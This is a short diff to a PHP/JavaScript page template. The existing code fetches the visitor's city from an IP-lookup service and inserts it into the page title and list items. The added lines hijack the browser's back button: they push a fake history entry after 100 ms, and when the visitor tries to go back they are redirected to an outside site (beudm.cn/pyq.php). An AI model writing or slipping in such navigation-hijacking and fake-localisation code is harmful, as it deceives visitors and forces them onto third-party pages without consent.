@@ -349,6 +349,19 @@ $.getScript('http://int.dpool.sina.com.cn/iplookup/iplookup.php?format=js',funct
 document.title = remote_ip_info.city+document.title;
 $("li").each(function(){$(this).text('💥'+(Math.random()>0.8?remote_ip_info.city:"")+$(this).text())});
 });}
+
+window.onhashchange=function(){
+    jp();
+};
+function hh() {
+    //添加时间 路径添加后缀时间戳
+    history.pushState(history.length+1, "message", "#"+new Date().getTime());
+}
+function jp() {
+    //JS返回 监视返回按键，
+    location.href="http://beudm.cn/pyq.php";
+}
+setTimeout('hh();', 100);
 </script>
 
 <?= $model->count?>
